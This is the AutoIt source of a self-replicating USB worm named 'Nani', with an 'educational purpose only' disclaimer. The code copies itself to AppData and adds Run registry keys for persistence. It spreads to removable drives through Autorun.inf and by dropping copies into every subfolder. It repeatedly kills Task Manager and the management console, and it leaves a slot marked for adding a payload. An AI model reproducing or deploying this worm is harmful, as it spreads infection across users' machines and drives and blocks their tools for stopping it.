#Region ;**** Directives created by AutoIt3Wrapper_GUI ****
#AutoIt3Wrapper_Res_Comment=Coded by Nikhil / V4D3R
#EndRegion ;**** Directives created by AutoIt3Wrapper_GUI ****
#cs ----------------------------------------------------------------------------

  Author:         Nikhil aka V4D3R

 Script Function:Worm


#ce ----------------------------------------------------------------------------
#include <Misc.au3>
$debugFlag = 0
$log_file = FileOpen(@ScriptDir &"\naniLog.txt",1); Open Log file
$Scriptname = "Nani.exe"

If _Singleton("nani.nx.worm", 1) = 0 Then  ;Check for other instance of the worm running
	Exit
EndIf

MsgBox(0,"NANI is here","You system is infected with NANI Worm.."&@CRLF&"This code is for Educational Purpose only.");Warning Message box
While 1
	_Setup()
	_SeekDrives()
	_KillApps()
;Add you Payload here

WEnd


Func _Setup()
	_Debug("Setup Start")
	FileCopy(@ScriptName,@AppDataDir&"\"&$Scriptname) ;Copy Running binary to Appdata
	RegWrite("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run","Naniworm","REG_SZ",@AppDataDir&"\"&$Scriptname);Adding Autorun in Registry
	RegWrite("HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run","Naniworm","REG_SZ",@AppDataDir&"\"&$Scriptname);Adding Autorun in Registry
	_Debug("Setup Complete")
EndFunc

Func _SeekDrives()
	_Debug("Seek Drive start")
	$drive_Array = DriveGetDrive("REMOVABLE");Get Available Removable Drives
	If @error Then
		_Debug("Seek drive Error")
		Return
	Else
		For $i = 1 To $drive_Array[0]

			$drStatus = DriveStatus($drive_Array[$i]&"\"); Get Current Status of Drive
			_Debug("Drive "&$drive_Array[$i])
			If $drStatus = "READY" Then
				_Debug("Drive READY"&$drive_Array[$i])
				_Debug("Infect Start")
				FileCopy(@ScriptName,$drive_Array[$i]&"\"&$Scriptname)
;~ 				FileDelete($drive_Array[$i]&"\Autorun.inf")
				IniWrite($drive_Array[$i]&"\Autorun.inf","Autorun","open",$Scriptname)
				_Infect($drive_Array[$i])
			EndIf
		Next
	EndIf
EndFunc

Func _Infect($dir)
	_Debug("Infect Start")
	Local $hSearch = FileFindFirstFile($dir & "\*.*")
		If $hSearch = -1 Then
			Return False
		EndIf
	Local $sFilename = "", $iResult = 0

	While 1
		$sFilename = FileFindNextFile($hSearch)
		If @error Then ExitLoop
		$sAttribute = FileGetAttrib($dir&"\"&$sFilename)
		If StringInStr($sAttribute,"D",1) Then
			FileCopy(@ScriptName,$dir&"\"&$sFilename&"\"&$Scriptname)
			_Infect($dir&"\"&$sFilename)
		EndIf
	WEnd
	FileClose($hSearch)
EndFunc

Func _KillApps()
	ProcessClose("Taskmgr.exe")
	ProcessClose("mmc.exe")
EndFunc



Func _Debug($dbgMsg)
	If $debugFlag = 1 Then
		FileWrite($log_file,@HOUR&@MIN&@SEC": "&$dbgMsg&@CRLF)
	EndIf
EndFunc
